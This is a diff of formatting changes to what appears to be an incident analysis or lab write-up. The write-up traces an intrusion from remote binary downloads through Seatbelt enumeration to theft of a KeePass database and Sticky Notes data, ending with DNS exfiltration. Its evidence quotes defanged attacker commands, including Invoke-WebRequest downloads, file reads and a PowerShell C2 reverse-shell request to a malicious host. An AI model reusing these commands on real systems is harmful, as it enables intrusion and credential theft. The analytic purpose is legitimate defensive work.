@@ -141,39 +141,48 @@ Evidence: The use of `iwr` (`Invoke-WebRequest`) to download binaries from a rem
 `iwr hXXp://files[.]bpakcaging[.]xyz/sb[.]exe -outfile sb[.]exe`
 `iwr hXXp://files[.]bpakcaging[.]xyz/sq3[.]exe -outfile sq3[.]exe`
 
-2. Discovery
-After gaining a foothold in the system, the attacker gathers information about the environment and its user data.
+2. Discovery - After gaining a foothold in the system, the attacker gathers information about the environment and its user data.
 
 Evidence: The attacker uses `Seatbelt.exe` (renamed to `sb.exe`), a known enumeration tool, with different flags to gather various system and user information.
+
 `.\\sb.exe -group=all`
+
 `.\\sb.exe system`
+
 `.\\sb.exe all`
+
 `Seatbelt.exe -group=user`
 
 Evidence: The attacker navigates the file system using cd and ls commands to find specific directories and files of interest.
+
 `cd j.westcott`, `cd Documents`, `ls AppData\...`
 
 Evidence: The attacker actively searches for a specific file, `protected_data.kdbx`, confirming it's a target for collection.
+
 `ls C:\Users\j.westcott\Documents\protected_data.kdbx`
 
 Evidence: The attacker also looks for and accesses a SQLite database file related to Sticky Notes (`plum.sqlite`), showing a broader collection objective.
+
 `ls AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite`
 
-3. Collection
-The attacker gathers specific data identified during the discovery phase.
+3. Collection - The attacker gathers specific data identified during the discovery phase.
 
 Evidence: The attacker uses a downloaded binary (`sq3.exe`) to query the Sticky Notes database, extracting data.
+
 `.\\Music\\sq3.exe AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite "SELECT * from NOTE limit 100"`
 
 Evidence: The attacker reads the entire contents of the target file into memory, preparing it for exfiltration.
+
 `$file='protected_data.kdbx'; ... $bytes = [System.IO.File]::ReadAllBytes($file);`
 
-4. Command and Control (C2)
-The attacker uses a custom C2 channel for communication and data transfer.
+4. Command and Control (C2) - The attacker uses a custom C2 channel for communication and data transfer.
 
 Evidence: The main PowerShell reverse shell connects to a domain and IP address, and uses headers for authentication.
+
 `$s='cdn[.]bpakcaging[.]xyz:8080'`
+
 `$p='hXXp://'`
+
 `$t=Invoke-WebRequest -Uri $p$s/27fe2489 -Method POST -Headers @{\"X-38d2-8f49\"=$i} -Body ...`
 
 Evidence: The exfiltration channel communicates with a malicious domain (`bpakcaging[.]xyz`) and an attacker-controlled server (`167[.]71[.]211[.]113`).
@@ -181,9 +190,11 @@ Evidence: The exfiltration channel communicates with a malicious domain (`bpakca
 **Exfiltrated Data and Method**
 
 What Was Exfiltrated?
+
 Based on the command `[System.IO.File]::ReadAllBytes($file)`, the exfiltrated file is named `protected_data.kdbx`.
 
 How Was It Exfiltrated?
+
 The file was exfiltrated using a technique called DNS exfiltration.
 
 Method: The file's content was read into memory, likely encoded into a hexadecimal string (inferred from the variable name $hex), and then split into 50-character chunks.
